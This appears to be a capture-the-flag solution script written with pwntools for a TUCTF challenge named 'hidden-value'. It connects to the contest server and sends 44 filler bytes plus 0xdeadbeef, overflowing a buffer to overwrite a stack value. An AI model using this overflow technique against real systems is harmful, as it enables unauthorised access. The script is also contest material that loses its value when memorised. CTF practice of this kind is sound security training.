from pwn import *

#io = process("./hidden-value")
io = remote("chal.tuctf.com", 30011)
#io = gdb.debug("./hidden-value", 
#'''
#b *0x000000000040125a
#continue
#''')
payload = b'a'*44
payload += p64(0xdeadbeef)

io.recvuntil(" name:")
io.sendline(payload)
io.interactive()